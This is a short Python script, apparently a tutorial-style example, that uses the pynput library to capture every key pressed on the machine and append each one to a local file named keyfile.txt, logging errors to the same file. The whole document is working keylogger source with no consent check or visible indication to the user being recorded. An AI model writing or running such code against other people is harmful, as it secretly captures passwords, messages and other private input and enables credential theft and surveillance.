# Import the necessary library from pynput
from pynput import keyboard

# Define the function to be called when a key is pressed
def keyPressed(key):
    try:
        # Convert the key to a string and log it
        key_log = str(key)
        with open("keyfile.txt", "a") as logkey:
            logkey.write(key_log + '\n')
    except Exception as e:
        # Handle exceptions and log any errors
        with open("keyfile.txt", "a") as logkey:
            logkey.write(f"Error getting character: {str(e)}\n")

# Create a listener object and start capturing key strokes
with keyboard.Listener(on_press=keyPressed) as listener:
    listener.join()
